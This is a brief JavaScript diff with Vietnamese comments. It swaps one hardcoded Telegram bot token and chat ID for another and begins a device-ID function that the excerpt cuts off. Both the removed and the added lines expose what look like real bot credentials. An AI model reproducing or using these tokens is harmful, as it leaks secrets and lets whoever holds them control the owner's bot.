@@ -1,5 +1,6 @@
-const TELEGRAM_BOT_TOKEN = "7967683322:AAGPKgvD9bzQuXj-Hu3Njij6gFbjCTqsv7Y"; // ⚠️ ĐỔI TOKEN MỚI
-const TELEGRAM_CHAT_ID = "6339940126"; // ID Telegram nhận tin nhắn
+// 📌 Cấu hình Telegram
+const TELEGRAM_BOT_TOKEN = "7701091551:AAHiuvyHcywcpVJ40PjRHTOyTb89RirN5RQ";
+const TELEGRAM_CHAT_ID = "7991407654";
 
 // 📌 Hàm tạo ID cố định cho thiết bị
 async function getFixedDeviceID() {
